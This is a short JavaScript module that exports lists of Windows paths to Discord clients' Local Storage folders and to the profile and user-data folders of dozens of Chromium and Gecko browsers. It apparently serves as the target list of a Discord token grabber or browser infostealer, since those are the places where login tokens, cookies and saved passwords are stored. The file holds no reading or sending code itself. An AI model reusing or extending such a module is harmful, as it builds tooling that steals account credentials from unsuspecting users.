const GetDiscordPaths = () => {
  return {
    'Discord Canary': `discordcanary\\Local Storage`,
    'Discord PTB': `discordptb\\Local Storage`,
    Lightcord: `Lightcord\\Local Storage`,
    Discord: `discord\\Local Storage`,
  };
};

const GetChromiumBrowsers = () => {
  return {
    'Google(x86)': `AppData\\Local\\Google(x86)\\Chrome\\User Data`,
    'Google SxS': `AppData\\Local\\Google\\Chrome SxS\\User Data`,
    Chromium: `AppData\\Local\\Chromium\\User Data`,
    Thorium: `AppData\\Local\\Thorium\\User Data`,
    Chrome: `AppData\\Local\\Google\\Chrome\\User Data`,
    MapleStudio: `AppData\\Local\\MapleStudio\\ChromePlus\\User Data`,
    Iridium: `AppData\\Local\\Iridium\\User Data`,
    '7Star': `AppData\\Local\\7Star\\7Star\\User Data`,
    CentBrowser: `AppData\\Local\\CentBrowser\\User Data`,
    Chedot: `AppData\\Local\\Chedot\\User Data`,
    Vivaldi: `AppData\\Local\\Vivaldi\\User Data`,
    Kometa: `AppData\\Local\\Kometa\\User Data`,
    Elements: `AppData\\Local\\Elements Browser\\User Data`,
    Epic: `AppData\\Local\\Epic Privacy Browser\\User Data`,
    uCozMedia: `AppData\\Local\\uCozMedia\\Uran\\User Data`,
    Fenrir: `AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer`,
    Catalina: `AppData\\Local\\CatalinaGroup\\Citrio\\User Data`,
    Coowon: `AppData\\Local\\Coowon\\Coowon\\User Data`,
    Liebao: `AppData\\Local\\liebao\\User Data`,
    'QIP Surf': `AppData\\Local\\QIP Surf\\User Data`,
    Orbitum: `AppData\\Local\\Orbitum\\User Data`,
    Comodo: `AppData\\Local\\Comodo\\Dragon\\User Data`,
    '360Browser': `AppData\\Local\\360Browser\\Browser\\User Data`,
    Maxthon3: `AppData\\Local\\Maxthon3\\User Data`,
    'K-Melon': `AppData\\Local\\K-Melon\\User Data`,
    CocCoc: `AppData\\Local\\CocCoc\\Browser\\User Data`,
    Amigo: `AppData\\Local\\Amigo\\User Data`,
    Torch: `AppData\\Local\\Torch\\User Data`,
    Sputnik: `AppData\\Local\\Sputnik\\Sputnik\\User Data`,
    Edge: `AppData\\Local\\Microsoft\\Edge\\User Data`,
    DCBrowser: `AppData\\Local\\DCBrowser\\User Data`,
    Yandex: `AppData\\Local\\Yandex\\YandexBrowser\\User Data`,
    'UR Browser': `AppData\\Local\\UR Browser\\User Data`,
    Slimjet: `AppData\\Local\\Slimjet\\User Data`,
    BraveSoftware: `AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data`,
    Opera: `AppData\\Roaming\\Opera Software\\Opera Stable`,
    'Opera GX': `AppData\\Roaming\\Opera Software\\Opera GX Stable`,
  };
};

const GetGeckoBrowsers = () => {
  return {
    Thunderbird: `AppData\\Roaming\\Thunderbird\\Profiles`,
    IceDragon: `AppData\\Roaming\\Comodo\\IceDragon\\Profiles`,
    'Pale Moon': `AppData\\Roaming\\Moonchild Productions\\Pale Moon\\Profiles`,
    Cyberfox: `AppData\\Roaming\\8pecxstudios\\Cyberfox\\Profiles`,
    BlackHaw: `AppData\\Roaming\\NETGATE Technologies\\BlackHaw\\Profiles`,
    Waterfox: `AppData\\Roaming\\Waterfox\\Profiles`,
    'K-Meleon': `AppData\\Roaming\\K-Meleon\\Profiles`,
    Mercury: `AppData\\Roaming\\mercury\\Profiles`,
    Firefox: `AppData\\Roaming\\Mozilla\\Firefox\\Profiles`,
    SeaMonkey: `AppData\\Roaming\\Mozilla\\SeaMonkey\\Profiles`,
  };
};

module.exports = {
  GetDiscordPaths,
  GetChromiumBrowsers,
  GetGeckoBrowsers,
};
